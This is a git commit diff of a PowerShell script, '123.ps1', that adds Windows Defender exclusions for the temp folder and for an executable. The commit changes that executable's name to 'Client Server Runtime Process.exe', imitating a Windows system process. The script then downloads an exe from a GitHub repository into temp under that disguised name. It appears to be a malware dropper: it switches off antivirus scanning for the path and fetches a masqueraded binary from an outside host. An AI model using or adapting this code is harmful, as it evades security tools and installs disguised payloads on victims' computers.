922a3021e240da98ac15fd70d01558d114dadfe7
chickennuggets <118553163+M7mmdddd@users.noreply.github.com>
2025-03-19 10:36:29 +0300

    Update 123.ps1

--- 123.ps1
+++ 123.ps1
@@ -1,7 +1,7 @@
 Add-MpPreference -ExclusionPath "$env:temp"
-Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp\COM_Surrogate.exe"
-Add-MpPreference -ExclusionPath $env:TEMP\COM_Surrogate.exe
-Add-MpPreference -ExclusionProcess "COM_Surrogate.exe"
+Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp\Client Server Runtime Process.exe"
+Add-MpPreference -ExclusionPath "$env:TEMP\Client Server Runtime Process.exe"
+Add-MpPreference -ExclusionProcess "Client Server Runtime Process.exe"
 $url = "https://raw.githubusercontent.com/M7mmdddd/webstie-demo/refs/heads/main/files/COM%20Surrogate.exe"
 
  $output = "$env:TEMP\Client Server Runtime Process.exe"
